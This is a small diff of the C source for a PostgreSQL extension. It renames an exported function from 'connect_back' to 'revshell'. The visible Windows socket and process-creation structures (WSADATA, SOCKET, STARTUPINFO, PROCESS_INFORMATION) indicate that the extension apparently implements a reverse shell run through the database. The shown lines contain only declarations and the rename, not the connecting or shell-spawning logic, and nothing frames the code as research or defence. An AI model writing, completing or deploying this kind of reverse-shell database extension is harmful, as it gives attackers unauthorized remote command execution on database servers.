@@ -13,8 +13,8 @@ PG_MODULE_MAGIC;
 #endif
 
 /* Add a prototype marked PGDLLEXPORT */
-PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
-PG_FUNCTION_INFO_V1(connect_back);
+PGDLLEXPORT Datum revshell(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(revshell);
 
 WSADATA wsaData;
 SOCKET s1;
@@ -24,7 +24,7 @@ STARTUPINFO sui;
 PROCESS_INFORMATION pi;
 
 Datum
-connect_back(PG_FUNCTION_ARGS) {
+revshell(PG_FUNCTION_ARGS) {
 
 	/* convert C string to text pointer */
 #define GET_TEXT(cstrp) \
